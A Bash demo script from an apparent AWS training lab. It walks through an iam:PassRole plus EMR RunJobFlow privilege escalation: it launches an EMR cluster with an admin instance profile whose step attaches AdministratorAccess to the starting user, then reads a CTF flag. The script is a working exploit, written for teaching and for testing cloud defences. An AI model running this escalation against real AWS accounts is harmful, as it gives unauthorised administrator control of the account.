#!/bin/bash
set -e

# Demo script for iam:PassRole + elasticmapreduce:RunJobFlow privilege escalation
# This script demonstrates how a user with iam:PassRole and elasticmapreduce:RunJobFlow
# can escalate privileges by creating an EMR cluster with an admin instance profile
# and executing a step via command-runner.jar that attaches AdministratorAccess to themselves.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local label="$1"
    shift
    echo -e "${DIM}[${label}]\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-emr-001-to-admin-starting-user"
EMR_CLUSTER_NAME="pl-prod-emr-001-to-admin-privesc-cluster"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + EMR RunJobFlow Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_emr_001_iam_passrole_elasticmapreduce_runjobflow.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract resource names from the grouped output
ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
ADMIN_INSTANCE_PROFILE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_instance_profile_name')
SERVICE_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.service_role_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo "Admin Role: $ADMIN_ROLE_NAME"
echo "Instance Profile: $ADMIN_INSTANCE_PROFILE_NAME"
echo "Service Role: $SERVICE_ROLE_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_REGION=$AWS_REGION
echo "Using region: $AWS_REGION"

# [OBSERVATION] Verify starting user identity using readonly creds (starting user does not have sts:GetCallerIdentity)
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity for context: $CURRENT_USER"
echo -e "${GREEN}✓ ReadOnly credentials confirmed${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create EMR cluster with malicious step
echo -e "${YELLOW}Step 5: Creating EMR cluster with admin instance profile and escalation step${NC}"
use_starting_creds
echo "This is the privilege escalation vector:"
echo "  - Passing admin instance profile ($ADMIN_INSTANCE_PROFILE_NAME) as JobFlowRole"
echo "  - Passing service role ($SERVICE_ROLE_NAME) as ServiceRole"
echo "  - Step uses command-runner.jar to attach AdministratorAccess to $STARTING_USER_NAME"
echo ""
echo -e "${BLUE}The EMR step will execute:${NC}"
echo "  aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
echo ""

show_attack_cmd "Attacker" "aws emr create-cluster --region $AWS_REGION --name \"$EMR_CLUSTER_NAME\" --release-label emr-7.0.0 --applications Name=Hadoop --instance-type m5.xlarge --instance-count 1 --service-role \"$SERVICE_ROLE_NAME\" --ec2-attributes \"InstanceProfile=$ADMIN_INSTANCE_PROFILE_NAME\" --steps '[{\"Name\":\"Escalate\",\"ActionOnFailure\":\"TERMINATE_CLUSTER\",\"Type\":\"CUSTOM_JAR\",\"Jar\":\"command-runner.jar\",\"Args\":[\"bash\",\"-c\",\"aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\"]}]' --auto-terminate --output json"
CLUSTER_RESULT=$(aws emr create-cluster \
    --region $AWS_REGION \
    --name "$EMR_CLUSTER_NAME" \
    --release-label emr-7.0.0 \
    --applications Name=Hadoop \
    --instance-type m5.xlarge \
    --instance-count 1 \
    --service-role "${SERVICE_ROLE_NAME}" \
    --ec2-attributes "InstanceProfile=${ADMIN_INSTANCE_PROFILE_NAME}" \
    --steps '[
      {
        "Name": "Escalate",
        "ActionOnFailure": "TERMINATE_CLUSTER",
        "Type": "CUSTOM_JAR",
        "Jar": "command-runner.jar",
        "Args": ["bash", "-c", "aws iam attach-user-policy --user-name '"${STARTING_USER_NAME}"' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
      }
    ]' \
    --auto-terminate \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create EMR cluster${NC}"
    exit 1
fi

CLUSTER_ID=$(echo "$CLUSTER_RESULT" | jq -r '.ClusterId')
echo "Cluster ID: $CLUSTER_ID"
echo -e "${GREEN}✓ EMR cluster created successfully${NC}\n"

# [OBSERVATION] Step 6: Wait for cluster to complete
echo -e "${YELLOW}Step 6: Waiting for EMR cluster to run step and terminate${NC}"
echo "EMR clusters take 5-15 minutes to provision, run the step, and terminate."
echo "Polling every 30 seconds with a 20-minute timeout..."
echo ""

use_readonly_creds

WAIT_TIME=0
MAX_WAIT=1200  # 20 minutes
while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws emr describe-cluster --region $AWS_REGION --cluster-id \"$CLUSTER_ID\" --query 'Cluster.Status.State' --output text"
    CLUSTER_STATE=$(aws emr describe-cluster \
        --region $AWS_REGION \
        --cluster-id "$CLUSTER_ID" \
        --query 'Cluster.Status.State' \
        --output text)

    ELAPSED_MIN=$((WAIT_TIME / 60))
    ELAPSED_SEC=$((WAIT_TIME % 60))
    echo "Cluster state: $CLUSTER_STATE (elapsed: ${ELAPSED_MIN}m ${ELAPSED_SEC}s)"

    if [ "$CLUSTER_STATE" = "TERMINATED" ]; then
        echo -e "${GREEN}✓ Cluster terminated (step completed and auto-terminate fired)${NC}"
        break
    elif [ "$CLUSTER_STATE" = "TERMINATED_WITH_ERRORS" ]; then
        echo -e "${RED}Cluster terminated with errors${NC}"
        # Surface the underlying reason so failures self-diagnose (service role perms,
        # subnet/VPC problems, instance type capacity, etc.)
        show_cmd "ReadOnly" "aws emr describe-cluster --region $AWS_REGION --cluster-id \"$CLUSTER_ID\" --query 'Cluster.Status.StateChangeReason' --output json"
        aws emr describe-cluster \
            --region $AWS_REGION \
            --cluster-id "$CLUSTER_ID" \
            --query 'Cluster.Status.StateChangeReason' \
            --output json || true
        echo "Checking step status to determine if escalation succeeded anyway..."
        break
    fi

    sleep 30
    WAIT_TIME=$((WAIT_TIME + 30))
done

if [ $WAIT_TIME -ge $MAX_WAIT ]; then
    echo -e "${RED}Cluster did not terminate within 20 minutes${NC}"
    echo "You can check the cluster status manually:"
    echo "  aws emr describe-cluster --region $AWS_REGION --cluster-id $CLUSTER_ID"
    exit 1
fi
echo ""

# [OBSERVATION] Step 7: Check step status
echo -e "${YELLOW}Step 7: Checking EMR step status${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws emr list-steps --region $AWS_REGION --cluster-id \"$CLUSTER_ID\" --query 'Steps[0].[Name,Status.State]' --output text"
STEP_INFO=$(aws emr list-steps \
    --region $AWS_REGION \
    --cluster-id "$CLUSTER_ID" \
    --query 'Steps[0].[Name,Status.State]' \
    --output text)

STEP_STATUS=$(echo "$STEP_INFO" | awk '{print $NF}')
echo "Step info: $STEP_INFO"

if [ "$STEP_STATUS" = "COMPLETED" ]; then
    echo -e "${GREEN}✓ Escalation step completed successfully${NC}"
else
    echo -e "${RED}Step status: $STEP_STATUS${NC}"
    echo "The step may have failed. Checking if policy was attached anyway..."
fi
echo ""

# Step 8: Wait for IAM propagation
echo -e "${YELLOW}Step 8: Waiting 15 seconds for IAM policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION] Step 9: Verify policy attachment
echo -e "${YELLOW}Step 9: Verifying AdministratorAccess policy attachment${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER_NAME --output table)
echo "$ATTACHED_POLICIES"

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER_NAME${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER_NAME${NC}"
    echo "The escalation step may have failed. Check EMR step logs for details."
    exit 1
fi
echo ""

# [EXPLOIT] Step 10: Verify admin access using the elevated starting user credentials
# Must use starting creds here — using readonly creds would be a false positive
# (readonly user has broad read permissions independently of the attack succeeding).
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users with the now-elevated starting user..."

use_starting_creds
show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "Note: IAM policy changes can take a few minutes to fully propagate"
    echo "You may need to wait a bit longer and try again"
    exit 1
fi
echo ""

# [EXPLOIT]
# Step 11: Capture the CTF flag
# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
use_starting_creds
echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/emr-001-to-admin"
show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --region "$AWS_REGION" --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_NAME (with iam:PassRole + elasticmapreduce:RunJobFlow)"
echo "2. Created EMR cluster ($EMR_CLUSTER_NAME) with:"
echo "   - Admin instance profile: $ADMIN_INSTANCE_PROFILE_NAME (JobFlowRole)"
echo "   - Service role: $SERVICE_ROLE_NAME"
echo "3. EMR step used command-runner.jar to execute:"
echo "   aws iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
echo "4. Achieved: Administrator Access"
echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER_NAME → (iam:PassRole + elasticmapreduce:RunJobFlow)"
echo -e "  → EMR cluster with admin instance profile + service role"
echo -e "  → (command-runner.jar step) → iam:AttachUserPolicy"
echo -e "  → AdministratorAccess attached to $STARTING_USER_NAME → Admin"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- EMR Cluster: $EMR_CLUSTER_NAME (Cluster ID: $CLUSTER_ID) - auto-terminated"
echo "- AdministratorAccess policy attached to: $STARTING_USER_NAME"

echo -e "\n${RED}Warning: The AdministratorAccess policy attachment remains${NC}"
echo -e "${RED}Warning: EMR cluster resources (logs, etc.) may persist${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
